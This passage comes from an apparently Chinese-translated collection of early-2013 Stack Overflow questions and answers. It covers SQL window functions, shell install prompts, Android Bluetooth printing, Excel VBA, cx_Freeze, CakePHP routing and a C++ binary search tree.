       NTILE(2) OVER (PARTITION BY a ORDER BY b) AS NtileForHaving
FROM T2
GROUP BY a,b, NtileForGroupBy
)
SELECT a,
       b,
       NTILE(2) OVER (PARTITION BY a ORDER BY b) AS NtileForSelect
FROM T3
WHERE NtileForHaving = 1 
```

由于这些都在`SELECT`语句中定义并且具有别名，因此很容易消除来自不同级别的结果的歧义，例如只需切换`WHERE NtileForHaving = 1`到`NtileForGroupBy = 1`

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-01-01T14:45:41.433

您可以通过将窗口函数放在子查询中来解决此问题：

```
select  invoice
,       rn
from    (
        select  Invoice
        ,       row_number() over(order by Invoice) as rn
        from    Table1
        ) as SubQueryAlias
group by
        invoice
,       rn 
```

# php - mysql + apache + php 安装脚本

> ID：14111327
> 
> 赞同：0
> 
> 时间：2013-01-01T14:34:21.047
> 
> 标签：php, mysql, apache

我可以从下面的代码中安装 MySQL 或任何包，但我希望从一个脚本中一个一个地安装多个包。

* * *

```
echo "Do you wish to install MySql?" 
select yn in "Yes" "No"; do 
case $yn in 
Yes ) yum -y install mysql; break;; 
No ) exit;; 
esac
done 
```

* * *

1）。如果输入`No`，那么它将进入下一个级别，例如`Do you wish to install Apache`。

2）。如果键入`Yes`它将安装 MySQL，然后请求下一个包，例如`Do you wish to install Apache`.

有人可以帮我写这个脚本吗？

我会向你解释。我想为**MySQL + Apache + PHP**安装创建脚本。
如果**MySQL**已经安装在我的机器上，我不想安装它，那么它会问我你想安装**Apache**吗？如果我按 1 它安装然后它会问我你想安装**PHP**然后自动退出。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:04:36.873

Bourne shell 的脚本片段的正确语法是：

```
echo "Do you wish to install MySql?" 
read yn
case "$yn" in 
    Yes)
        yum install mysql
        ;; 
    No) ;; 
esac 
```

# xna - 将 Kinect 的骨架数据与 .fbx 模型的特定部分匹配

> ID：14111328
> 
> 赞同：0
> 
> 时间：2013-01-01T14:34:39.140
> 
> 标签：xna, kinect

我正在开发一个使用角色模型的游戏。使用 Kinect，我现在可以根据 Kinect 摄像机前的玩家将所有动作应用于模型。现在我只想对模型应用手部动作，其余的身体必须按原样固定。任何人都可以帮助我实现这一目标...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T23:36:22.250

在我看来，您想要一个固定的骨架，您将根据骨架输入更新关节信息并使用它来更新您的 UI - 而不是将输入骨架绘制到 UI。

由于 Microsoft Kinect SDK 开发人员将 Joint 类的 JointType 设置为内部，因此创建您自己的 Skeleton 对象存在问题 - 这意味着无法更新 JointType，因此无法更新关节位置。

因此，要解决此问题，您需要：

1.  将描述静止用户的关节位置保存在代码中
2.  创建一个新的骨架对象
3.  将传入的 Skeleton 对象从传感器复制到新实例化的 Skeleton。
4.  现在用静止点更新这个骨架，除了你需要传感器位置的关节

这里的关键点是第 3 步。这允许您使用自定义位置数据创建自己的 Skeleton 对象，这是解决问题所需要做的。

# c++ - 什么是 C++ 中的“文字”？

> ID：14111329
> 
> 赞同：12
> 
> 时间：2013-01-01T14:34:41.977
> 
> 标签：c++, terminology

> **可能重复：**
> [“字面”这个词是什么意思？](https://stackoverflow.com/questions/485119/what-does-the-word-literal-mean)

在阅读有关 C++ 的文献时，我经常会遇到“literal”这个词。我有点不清楚这个术语在 C++ 中的确切含义。

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2013-01-01T14:35:45.600

文字是直接在代码中呈现的一些数据，而不是通过变量或函数调用间接呈现。

以下是一些示例，每行一个：

```
42
128
3.1415
'a'
"hello world" 
```

构成文字的数据不能被程序修改，但可以复制到变量中以供进一步使用：

```
int a = 42;  // creates variable `a` with the same value as the literal `42` 
```

[这个概念绝不是 C++ 独有的](http://en.wikipedia.org/wiki/Literal_%28computer_programming%29)。

术语“字面量”来自这样一个事实，即您已经将数据[*字面意义*](http://theoatmeal.com/comics/literally)上地写入程序，即完全按照写入的方式写入，而不是“隐藏”在变量名后面。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-01T14:36:54.970

Wikipedia 快速为您提供有关[文字](http://en.wikipedia.org/wiki/Literal_%28computer_programming%29)的信息。

在您的 C 或 C++ 源代码中，诸如`1234`,之类的东西`nullptr`（在最近的 C++ 中）`"abcd"`是文字。

# c - TreeView - 设置默认选择项目并突出显示（蓝色）该项目

> ID：14111333
> 
> 赞同：2
> 
> 时间：2013-01-01T14:35:13.060
> 
> 标签：c, winapi, treeview

当我创建一个 TreeView 控件时，插入几个项目，然后我使用 TVM_SELECTITEM 来选择一个默认项目。但是这个项目没有被蓝色突出显示。稍后，如果我使用鼠标或键盘选择一个项目，它将被突出显示。

那么如何使默认项被突出显示呢？

这是我使用的函数和参数：

```
SendMessage(hTreeView, TVM_SELECTITEM, TVGN_CARET, (LPARAM)hItem); 
```

* * *

我刚刚发现我只需要将注意力集中在 TreeView 控件上就可以了。

但是，当用户选择某些选项时，即使 TreeView 失去焦点，如何在项目上显示灰色突出显示，如下图所示：

![在此处输入图像描述](../Images/ffc81affc9708f271b646ac15406cd64.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T16:30:28.897

既然您找到了原始问题的答案，我将回答您的第二个问题：

> 我刚刚发现我只需要将注意力集中在 TreeView 控件上就可以了。
> 
> 但是，当用户选择某些选项时，即使 TreeView 失去焦点，如何在项目上显示灰色突出显示，如下图所示：

为您的 TreeView 控件提供`TVS_SHOWSELALWAYS`窗口样式。（顺便说一句，您显示的屏幕截图使用 ListView 控件，而不是 TreeView 控件。ListView 控件具有等效的`LVS_SHOWSELALWAYS`样式。）

# apache-flex - Spark Tile 布局 - 从点获取渲染器

> ID：14111339
> 
> 赞同：0
> 
> 时间：2013-01-01T14:36:11.967
> 
> 标签：apache-flex, layout, tile, flex-spark

火花瓷砖列表中是否有内置方法可以从给定点获取项目？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T18:47:43.627

正如@www.Flextras.com 建议的那样，查看源代码可能很有用。`TileLayout`有一个名为的方法`getElementNearestScrollPosition()`，它将为您提供最接近`Point`您指定的 a 的元素的索引。但是，此方法隐藏在 Flex 的`mx_internal`命名空间中，因此它被排除在 ASDocs 之外。

这是一个似乎有效的简单示例。我没有显示 itemRenderer。

主要.mxml：

```
<?xml version="1.0" encoding="utf-8"?>
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
               xmlns:s="library://ns.adobe.com/flex/spark" 
               xmlns:mx="library://ns.adobe.com/flex/mx" xmlns:local="*">

    <fx:Script>
        <![CDATA[
            import mx.core.mx_internal;

            use namespace mx_internal;

            protected function list1_clickHandler(event:MouseEvent):void
            {
                var localPointInList:Point = list.globalToLocal(new Point(event.stageX, event.stageY));
                trace(tileLayout.getElementNearestScrollPosition(localPointInList));
            }
        ]]>
    </fx:Script>

    <fx:Declarations>
        <s:ArrayCollection id="foo">
            <fx:Object date="Jan 1, 2012"/>
            <fx:Object date="Jan 1, 2013"/>
            <fx:Object date="Jan 1, 2014"/>
        </s:ArrayCollection>
    </fx:Declarations>

    <s:layout>
        <s:HorizontalLayout />
    </s:layout>

    <s:Button label="I'm a button"/>

    <s:List id="list" dataProvider="{foo}" itemRenderer="TestRenderer" click="list1_clickHandler(event)">
        <s:layout>
            <s:TileLayout id="tileLayout" requestedColumnCount="2" />
        </s:layout>
    </s:List>   

</s:Application> 
```

请注意，我正在本地坐标和全局坐标之间进行一些转换。您需要这样做将 中的全局坐标转换`MouseEvent`为 的坐标空间`List`。我还在`Button`主应用程序中添加了一个，只是为了测试这种转换......按钮的存在使得列表的局部坐标与全局坐标**不匹配。**如果列表位于原点 (0,0)，则无需在坐标空间之间进行这种转换……但这在现实世界的应用程序中很少发生。

# android - 从 Android 应用程序点击直接链接时的文件大小

> ID：14111348
> 
> 赞同：2
> 
> 时间：2013-01-01T14:38:24.563
> 
> 标签：android, android-intent

在我的 Android 应用程序中，我可以选择下载另一个应用程序（apk 文件）。该应用程序的文件大小约为 3MB，因此用户需要等待下载完成。

**它是如何在我的应用程序中实现的**

在我的应用程序中有一个按钮，当用户点击该按钮时，它会点击我的应用程序服务器直接提供的 apk 文件的 url。

现在为了方便用户，我想显示应用程序的大小和下载进度，但是当我直接点击 url 进行下载时，我不知道如何找到应用程序的大小？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-06-04T15:38:05.507

这是一个真正迟到的答案，但如果`HTTP`用于您的下载，您可以发送`HEAD`请求以从文件中检索信息。然后使用`GET`检索内容。

# background-image - 多屏背景图片尺寸

> ID：14111351
> 
> 赞同：1
> 
> 时间：2013-01-01T14:38:50.017
> 
> 标签：background-image, tablet, retina-display, smartphone, multiple-monitors

我正在开发一个图像重的网站，该网站基本上具有三种多屏幕设计：智能手机、平板电脑和台式机。

该站点的主要功能是背景/全屏图像。有没有人对这些背景图像的建议尺寸有任何建议？

它们都将是渐进式 jpeg，因为这似乎是[调整大小和优化的最明智的途径](http://calendar.perfplanet.com/2012/progressive-jpegs-a-new-best-practice/)。

处理不同的图像大小将是另一个测试，但本质上在客户端处理它似乎是明智的，因为这种设计允许礼貌的加载器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T21:18:45.137

我建议对非视网膜手机进行格式化，例如**480x320的 iPhone 3Gs、** **1136x640**的视网膜 iPhone **5、2048x1536**的视网膜 iPad、**2880x1800**的视网膜 mac book pro 。然后设置您的媒体查询，为非视网膜 ipad、标准桌面（您的默认图像）和在 MBP 视网膜 (2560x1600) 附近有显示器的 Google Nexus 10 选择最佳尺寸。

 **对于背景图像，您将需要使用媒体查询。对于全屏图像，我所做的是实现一个 JavaScript 模块，该模块允许您模仿响应图像社区组提出的[图片元素。](http://responsiveimages.org/)或者，如果您愿意，可以走“srcset”路线。**

# javascript - 使用codeigniter中的值从表单打印数据的功能

> ID：14111352
> 
> 赞同：1
> 
> 时间：2013-01-01T14:39:00.277
> 
> 标签：javascript, codeigniter, printing

我使用 codeigniter 创建了一个包含多个表单的页面。我想显示一个用于从表单打印数据的弹出窗口，并且该窗口中有一个打印按钮。但我不知道如何以它的形式获取数据，直到退出弹出窗口以在 codeigniter 中打印。你能帮我为这个问题编码吗？老实说，我从来没有做过这样的编码问题，因为我也是初学者。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:40:20.693

所以你是初学者，太好了。在这里，您有一些想法可以尝试。**此解决方案使用 jQuery 获取服务器数据，将其放入动态创建的 iframe 并打印（对 CI、WP 等有用）。**这就是你想要的，嗯？？？

1.- jQuery 的东西

```
// <input type="button" id="print_me" data-form_id="101">
$("#print_me").live("click", function() {
    var form_id = $(this).data("form_id"); // get value 101
    $.post(
            // url to server where you get data to print
            window.location.href,
            {
                // vars sent to server to get data to print
                form_id : form_id // send form_id=101
                // etc
            },
            // output.contents have content to print
            function(output) {
                // create iframe
                var ifrm = document.createElement("iframe");
                ifrm.style.display = "none";
                document.body.appendChild(ifrm);
                setTimeout(function() {
                    // put content into the inframe
                    $(ifrm).contents().find("body").html(output.contents);
                }, 1);
                // print when iframe is loaded
                ifrm.onload = function() {
                    ifrm.contentWindow.print();
                }
            }, 'html');
}); 
```

2.- 服务器进程

```
$form_id = $_REQUEST['form_id']; // here we receive our data
ob_start();
// echo HTML formatted data to print
$contents            = ob_get_contents(); // $contents store all echoed HTML
ob_end_clean();
$output['contents']  = $contents; // wrap in $output
echo json_encode($output); // echo json encoded data
exit; // you must exit here! 
```

您必须深入调查每一个步骤。一旦你实现了你的目标，你就会学到很多东西。祝你好运！

# android - 安卓蓝牙打印

> ID：14111353
> 
> 赞同：11
> 
> 时间：2013-01-01T14:39:05.787
> 
> 标签：android, printing, bluetooth

我正在编写一个将数据发送到蓝牙打印机的应用程序。谁能帮我 ？如何使用 android 蓝牙堆栈进行打印？或者是否有任何外部 api 或 sdk 可以使用？

这是我搜索蓝牙的代码...

```
bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
registerReceiver(ActionFoundReceiver,
        new IntentFilter(BluetoothDevice.ACTION_FOUND));

private final BroadcastReceiver ActionFoundReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (BluetoothDevice.ACTION_FOUND.equals(action)) {
            BluetoothDevice device = intent
                    .getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
            btArrayAdapter.add(device.getName() + "\n"
                    + device.getAddress());
            btArrayAdapter.notifyDataSetChanged();
        }
    }
}; 
```

这是我将数据发送到打印机的代码..

```
BluetoothDevice mDevice = bluetoothAdapter.getRemoteDevice("00:15:FF:F2:56:A4");
Method m = mDevice.getClass().getMethod("createRfcommSocket",
        new Class[] { int.class });
mBTsocket = (BluetoothSocket) m.invoke(mDevice, 1);
System.out.println("Connecting.....");
mBTsocket.connect();
System.out.println("Connected");
OutputStream os = mBTsocket.getOutputStream();
os.flush();
os.write(Receipt.getBytes());
// mBTsocket.close(); 
```

当我写 socket.close() 时，数据没有打印到打印机，因为套接字连接在打印数据之前关闭了..如果我没有写 socket.close() 那么数据只打印一次..我不会能够第二次打印数据，直到我重新启动手机的蓝牙。

任何人都可以解决它吗？？？或者有没有其他方法可以摆脱这种印刷？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-03T10:28:10.617

我得到了我的问题的解决方案......

如果我想多次打印数据，那么您不需要与设备创建新的套接字连接...而是调用 outputstream.write(bytes) 方法。

最后，如果您想断开设备，请调用 mBTScoket.close() 方法断开设备。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-12-25T11:57:56.940

您可以为任何打印机使用 printooth 库，printooth 很简单且有据可查， [https://github.com/mazenrashed/Printooth](https://github.com/mazenrashed/Printooth)

```
var printables = ArrayList<Printable>()
var printable = Printable.PrintableBuilder()  
    .setText("Hello World") //The text you want to print
    .setAlignment(DefaultPrinter.ALLIGMENT_CENTER)
    .setEmphasizedMode(DefaultPrinter.EMPHASISED_MODE_BOLD) //Bold or normal  
    .setFontSize(DefaultPrinter.FONT_SIZE_NORMAL)
    .setUnderlined(DefaultPrinter.UNDELINED_MODE_ON) // Underline on/off
    .setCharacterCode(DefaultPrinter.CHARACTER_CODE_USA_CP437) // Character code to support languages
    .setLineSpacing(DefaultPrinter.LINE_SPACING_60)
    .setNewLinesAfter(1) // To provide n lines after sentence
    .build()
printables.add(printable)
BluetoothPrinter.printer().print(printables) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-02T13:17:09.127

如果您已连接到设备并配对。

因此，对于打印，打印机需要字节。所以我创建了一个方法。

只需调用此方法并在其中传递字符串即可打印。

**`String str = new String("This is the text sending to the printer");`**

```
private void printData() {
    // TODO Auto-generated method stub

    String newline = "\n";
    try {
        out.write(str.getBytes(),0,str.getBytes().length);
        Log.i("Log", "One line printed");
    } catch (IOException e) {
        Toast.makeText(BluetoothDemo.this, "catch 1", Toast.LENGTH_LONG).show();
        e.printStackTrace();
        Log.i("Log", "unable to write ");
        flagCheck = false;
    }
    try {
        out.write(newline.getBytes(),0,newline.getBytes().length);
    } catch (IOException e) {        
        Log.i("Log", "Unable to write the new line::");
        e.printStackTrace();
        flagCheck = false;
    }
    flagCheck = true;
} 
```

# file-upload - 未使用 web.xml 时的 Primefaces 文件上传过滤器

> ID：14111355
> 
> 赞同：2
> 
> 时间：2013-01-01T14:39:41.357
> 
> 标签：file-upload, jsf-2, primefaces, jboss7.x, servlet-filters

我想在我的 jboss 7 Web 应用程序中使用 primefaces 文件上传控件。由于我不使用任何 web.xml（Java EE 6 不需要），我如何指定使文件上传正常工作所需的过滤器？我应该为此创建一个 web.xml 还是可以使用注释代替？

先感谢您！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T13:11:17.037

从技术上讲，您确实应该`web.xml`自己创建文件。这并不难，只需`/WEB-INF/web.xml`使用以下启动模板创建一个文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns="http://java.sun.com/xml/ns/javaee" 
    xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
    version="3.0">

    <!-- Your config here. -->

</web-app> 
```

如果您真的很认真并且对“XML 样板”有很大的反感，那么您总是可以自制一个过滤器类，该过滤器类使用所需的`@WebFilter`注释扩展 PrimeFaces 文件上传过滤器。

```
package com.example;

import javax.servlet.annotation.WebFilter;
import org.primefaces.webapp.filter.FileUploadFilter;

@WebFilter("*.jsf") // Or @WebFilter(servletNames={"Faces Servlet"})
public class AnnotatedPrimeFacesFileUploadFilter extends FileUploadFilter {
    // NOOP.
} 
```

# iphone - UITableView-didSelectRowAtIndexPath 调用didSelectRowAtIndexPath时出现问题

> ID：14111357
> 
> 赞同：0
> 
> 时间：2013-01-01T14:40:15.593
> 
> 标签：iphone, uitableview

我有一个`UITableView`CustomCell，在我的CustomCell中我添加了`UIImage`，`UILabel`......但是，当我在第1行中选择单元格并删除`UIImage`它时：`[[cell.contentView viewWithTag:TAG_FOR_TOPIMAG]removeFromSuperview];`但是，索引7处的单元格被更改为相同的单元格1。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:20:48.137

表视图重用单元格 (dequeueReusableCell...)。
因此，同一个单元格（视图）可以用于表中的多个索引。
在您更改单元格的布局（添加/删除/修改子视图）后，该单元格（视图）每次出现在屏幕上时都会出现修改 - 即使它每次代表不同的索引。

例如，在您的情况下，您可能在屏幕上同时显示最多 6 个单元格。
因此，您已经修改了一些单元格（一旦您修改它就显示为索引 1），之后您滚动表格，索引为 1 的单元格从屏幕上消失了，然后应该显示索引为 7 的单元格（在滚动期间）。该表将使用用于显示索引为 1 的行的相同单元格（完全相同的 UITableViewCell 对象）。
但是您已从中删除了图像...

当您使用表格时，您必须始终牢记这一点。
在您的情况下，我建议您将图像视图的可见性设置为隐藏并在每种`tableView"cellForRowAtIndexPath:`方法中恢复它（不在`if (cell == nil)`语句内 - 在它之后）。

# mysql - 设置带有和不带有 www 的 mysql 服务器名称

> ID：14111359
> 
> 赞同：-1
> 
> 时间：2013-01-01T14:40:44.190
> 
> 标签：mysql

我在我的 linux ubuntu 10.04 上使用 mysql 服务器。当我用作 mysql 服务器名称
时，一切正常。`example.com`

当我`www.example.com`用作 mysql 服务器名称时，连接不起作用。我在哪里可以更改设置。我网站的 URL 使用 www 和没有。

mysql 服务器名称是 mysql 配置中的设置还是我的域的主机名？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:50:51.573

您可以检查您的 MySQL 服务器用户表。当您看到用户时，对其进行编辑并为他/她可以连接到的主机设置此值：

%example.com

% 是“example.com”前面所有内容的通配符。第二种选择是通过 CREATE USER [http://dev.mysql.com/doc/refman/5.1/en/create-user.html添加一个新的用户<->主机组合](http://dev.mysql.com/doc/refman/5.1/en/create-user.html)

**但是注意**：您永远不应该，永远，永远不要从本地主机外部连接到您的 MySQL。如果是这样，请使用 SSH 隧道来执行此操作。

# excel - 对象“_Global”的方法“范围”失败 - 重新激活先前的 ActiveCell

> ID：14111365
> 
> 赞同：0
> 
> 时间：2013-01-01T14:41:38.780
> 
> 标签：excel, vba

作为一个更大项目的一部分，我编写了这个小程序，并希望通过在运行代码之前重新激活最后一个活动单元格来使其更加用户友好。但是，它给了我运行时错误 1004：对象“_Global”的方法“范围”失败。

我设法重新激活了以前的 ActiveWorksheet，但是如何让它重新激活实际的单元格？我在这里查看了讨论：[运行时错误'1004'：对象'_Global'的方法'范围'失败](https://stackoverflow.com/questions/12174723/run-time-error-1004-method-range-of-object-global-failed)

这使我认为问题出在我引用 的方式上`OldActiveCell`，但我仍然找不到解决方案。

有谁知道这个问题的答案？下面的代码：

```
Sub SortData()
    'Sorts Data on Input Sheet; first after project ID and then position type
    Dim DataRange As Range
    Dim OldActiveSheet As Object
    Dim OldActiveCell As Object

    'Define variable for currently active cell to reactivate it afterwards
    Set OldActiveSheet = ActiveSheet
    Set OldActiveCell = ActiveCell
    Sheets("Input").Activate

    Range("DataRange").Activate
        ActiveSheet.Sort.SortFields.Clear
        'First filter criterium
        ActiveSheet.Sort.SortFields.Add Key:=Range("ProjectList") _
            , SortOn:=xlSortOnValues, Order:=xlAscending, DataOption:=xlSortNormal
        'Second filter criterium
        ActiveSheet.Sort.SortFields.Add Key:=Range("PositionType") _
            , SortOn:=xlSortOnValues, Order:=xlDescending, DataOption:=xlSortNormal
        'Loop through and sort
        With ActiveSheet.Sort
            .SetRange Range("DataRange")
            .Header = xlGuess
            .MatchCase = False
            .Orientation = xlTopToBottom
            .SortMethod = xlPinYin
            .Apply
        End With
    'Reactivate previous active cell
    Range("OldActiveSheet.OldActiveCell").Activate
End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:46:33.887

替换`Range("OldActiveSheet.OldActiveCell").Activate`为

```
OldActiveSheet.Activate
OldActiveCell.Activate 
```

* * *

显然您认为`Range("DataRange")`有效，因为您有一个 Range 变量名为`DataRange`. 不，它有效，因为您在某处有一个[命名范围](http://office.microsoft.com/en-us/excel-help/define-and-use-names-in-formulas-HA010147120.aspx)`DataRange`，命名为. 如果您将它们的名称作为字符串传递，Range 将不会获取您的局部变量。任何方法或程序都不会。

# linux - CX_Freeze 和 guiqwt 适用于 windows 而不是 linux

> ID：14111366
> 
> 赞同：0
> 
> 时间：2013-01-01T14:42:14.817
> 
> 标签：linux, cx-freeze

我使用 CX_Freeze 来冻结我的一个 python 程序。构建系统在 Windows 中运行良好。我可以创建一个目录，其中包含将在任何 Windows 系统中运行的可执行和必要的依赖项。

当我在 Linux 中尝试相同时，构建部分

```
python setup.py 
```

工作正常。但是当我尝试运行构建的可执行文件时，它会出现以下错误。

```
 File "/usr/local/lib/python2.7/dist-packages/cx_Freeze/initscripts/Console.py", line 27, in <module>
exec code in m.__dict__
File "test.py", line 1, in <module>
File "/usr/local/lib/python2.7/dist-packages/guidata/__init__.py", line 540, in <module>
import guidata.config
File "/usr/local/lib/python2.7/dist-packages/guidata/config.py", line 19, in <module>
add_image_module_path("guidata", "images")
File "/usr/local/lib/python2.7/dist-packages/guidata/configtools.py", line 100, in add_image_module_path
add_image_path(get_module_data_path(modname, relpath=relpath), subfolders)
File "/usr/local/lib/python2.7/dist-packages/guidata/configtools.py", line 86, in add_image_path
for fileobj in os.listdir(path):
OSError: [Errno 20] Not a directory: '/home/user/tmp/dist/library.zip/guidata/images' 
```

似乎 guidata 正在尝试在不存在的 library.zip/guidata/images 目录下查找图像。我确保在 Windows 和 linux 上运行相同版本的 guidata、cx_Freeze。感谢您为解决该问题提供的任何帮助。

最小的例子

```
import guidata                                                                                                                              
_app = guidata.qapplication() # not required if a QApplication has already been created

import guidata.dataset.datatypes as dt
import guidata.dataset.dataitems as di

class Processing(dt.DataSet):
    """Example"""
    a = di.FloatItem("Parameter #1", default=2.3)
    b = di.IntItem("Parameter #2", min=0, max=10, default=5)
    type = di.ChoiceItem("Processing algorithm",
                     ("type 1", "type 2", "type 3"))

param = Processing()
param.edit() 
```

安装文件

```
import sys
import os

"""Create a stand-alone executable"""

try:
    import guidata
    from guidata.disthelpers import Distribution
except ImportError:
    raise ImportError, "This script requires guidata 1.4+"

def create_executable():
    """Build executable using ``guidata.disthelpers``"""
    dist = Distribution()
    dist.setup(name='Foo', version='0.1',
           description='bar',
           script="test.py", target_name='test.exe')
    dist.add_modules('guidata', 'guiqwt')
    # Building executable
    dist.build('cx_Freeze')

if __name__ == '__main__':
    create_executable() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T21:48:26.153

好的。这是我自己的问题的答案。经过大量挖掘，我意识到这是 guidata 和/或 python 的 os.path 模块中的一个错误。发生的事情是这样的。在 guidata 模块上，在 configtools.py 文件中，有一个函数 get_module_data_path，用于检查 /foo/bar/library.zip/yap 等路径的父“目录”是否为文件。

```
 import os.path as osp
...
...
    datapath = get_module_path(modname)
    parentdir = osp.join(datapath, osp.pardir)
    if osp.isfile(parentdir):
        # Parent directory is not a directory but the 'library.zip' file:
        # this is either a py2exe or a cx_Freeze distribution
        datapath = ... 
```

现在测试

```
osp.isfile("/foo/bar/library.zip/yap/..") 
```

在 Windows 中返回 True，但在 Linux 中返回 False。这破坏了代码。Python 文档不清楚这是一个错误还是预期的行为。

目前我没有解决方案，但有一个 hack。我将上面的代码更改为：

```
 import os.path as osp
...
...
    datapath = get_module_path(modname)
    parentdir = osp.join(datapath, osp.pardir)
    parentdir2 = osp.split(datapath.rstrip(os.path.sep))[0]
    if osp.isfile(parentdir) or osp.isfile(parentdir2):
        # Parent directory is not a directory but the 'library.zip' file:
        # this is either a py2exe or a cx_Freeze distribution
        datapath = ... 
```

一切都很好。

# php - cakephp问题中的动态路由

> ID：14111368
> 
> 赞同：1
> 
> 时间：2013-01-01T14:43:03.773
> 
> 标签：php, arrays, cakephp

我想为我网站的静态页面使用动态路由。

我在我的 Routes 文件中使用了以下代码

```
$arr = ClassRegistry::init('Page'); 
```

和

```
$this->loadModel('Page');
$arr = $this->Page->find('all');
foreach($arr as $value)
{
   //my code
} 
```

但它不起作用，并显示如下错误：

> ClassRegistry 未定义

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T17:44:14.177

## 不要那样做

您试图将控制器代码放在您的路由文件中，并打算使您的站点如此不必要地依赖数据库。当然，您的整个站点可能依赖于数据库，但是通过使您的路由依赖于数据库，所有使其到达 cakephp 的请求（这意味着，所有不是 webroot 中的静态文件的请求）都需要与数据库对话至少减慢速度，如果数据库出现任何问题，您的网站对于所有请求都是致命错误的白页。这是因为在请求处理过程的早期就加载了路由文件。路由文件不应该包含任何真正的逻辑 - 只是`Router::connect`语句。

## 替代方案：使用包罗万象的路线

如果您有任何可用于静态页面的模式，请使用它以便您只有一个路由定义。IE：

```
Router::connect('/x/*', array('controller' => 'some', 'action' => 'thing')); //eerily similar to the default static pages route 
```

## 替代方案：编写静态路由文件

每当您的路由规则发生更改并将它们写入静态文件时，无论您喜欢什么，都可以构建您的路由逻辑。因此，您的 routes.php 文件变为：

```
<?php
... routes that don't change ...
require 'path/to/dynamic_routes_file.php'; 
```

您可以使用相关模型的 afterSave 处理程序来触发重建此动态路由文件。

## 更多选择

还有许多其他方法可以处理这种事情，例如[覆盖错误处理过程](http://book.cakephp.org/2.0/en/development/errors.html#changing-fatal-error-behavior)以首先检查是否有这些依赖于 db 的路由要处理 - 或者简单地创建一个[自定义路由类](http://book.cakephp.org/2.0/en/development/routing.html#custom-route-classes)，它可以实现你想要的任何东西。

不管你做什么——目标是运行时的逻辑尽可能简单/缓存/静态——不要构建一个让所有请求都需要一直与数据库对话的系统。

# objective-c - iOS 上的 Cocos2d：2d 台球缩放

> ID：14111369
> 
> 赞同：2
> 
> 时间：2013-01-01T14:43:28.840
> 
> 标签：objective-c, ios, cocos2d-iphone

我想制作一个台球游戏，用户可以捏住台球桌进行缩放，这样他就可以精确地射出口袋。

所以，这意味着我需要一个大型台球桌图形。

在 cocos2d 中处理这种情况的最佳方法是什么？

如何加载图形？图形大小有什么限制？

我有很多疑问，因为我不确定要走哪条路。

问候米尔扎

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:58:18.297

对于像台球桌这样简单的东西，使用矢量图形渲染它可能会更好。这意味着您将需要更少的图形（可能只需要几个纹理），并且您可以无限缩放而无需所有图形图像开销。

# matlab - 在matlab中绘制到矩阵的imagesc

> ID：14111371
> 
> 赞同：1
> 
> 时间：2013-01-01T14:43:33.173
> 
> 标签：matlab, matrix

我想将 imagesc 返回的图保存在矩阵中。我怎样才能做到这一点？我只知道 imagesc 返回一个句柄，但我不知道如何处理它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:13:14.673

的数据`imagesc`存储在`CData`属性中，因此使用它来提取它：

```
X = get(h, 'CData'); 
```

假设`h`是你的句柄。

现在`X`包含您的图像数据，您可以将其保存到文件中，例如：

```
save somefile.mat X 
```

# c++ - 二叉搜索树？

> ID：14111373
> 
> 赞同：-4
> 
> 时间：2013-01-01T14:43:48.690
> 
> 标签：c++, class, pointers, binary-search-tree

我正在尝试使用 C++ 创建二叉搜索树。我只使用插入数据和查找数据的函数。我似乎无法让程序运行，尽管我发现它非常合乎逻辑且正确？

任何帮助将不胜感激。

```
#include<iostream>
using namespace std;

template <class T>
class BinarySearchTree
{
private:
    struct tree
    {
        tree *leftchild;
        tree *rightchild;
        T data;
    };
    tree *root;
public:
    BinarySearchTree()
    {
        root=NULL; 
    }
    void insert(T);
    void searchForItem(T);
};

template<class T>
void BinarySearchTree<T>::insert(T newNum)
{
    tree *newItem = new tree; 
    tree *parent; 

    newItem->data = newNum;
    newItem->leftchild = NULL;
    newItem->rightchild = NULL;

    if(root==NULL) 
        root=newItem;

    else
    {
        tree *current;
        current=root;
        while(current) 
        {
            parent = current;

            if(newItem->data > current->data)
                current = current->rightchild;
            else
                current = current->leftchild;
        }

        if(newItem->data > parent->data)
            parent->rightchild = newItem;
        else
            parent->leftchild = newItem;
    }

}

template<class T>
void BinarySearchTree<T>::searchForItem(T toFindNum)
{
    tree *current;
    tree *parent;

    current = root;
    if(current->data == toFindNum)
        cout<<toFindNum<<" is the root of this binary search tree."<<endl;

    while(current->data != toFindNum)
    {
        parent = current;

        if(current->data > toFindNum)
            current = current->rightchild;
        else
            current = current->leftchild;
    }

    cout<<toFindNum<<" is the child of "<<parent->data<<endl;
}
int main()
{
    BinarySearchTree<int> b;

    b.insert(5);
    b.insert(4);
    b.insert(3);
    b.insert(2);
    b.insert(7);

    b.searchForItem(4);
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-01T14:54:08.463

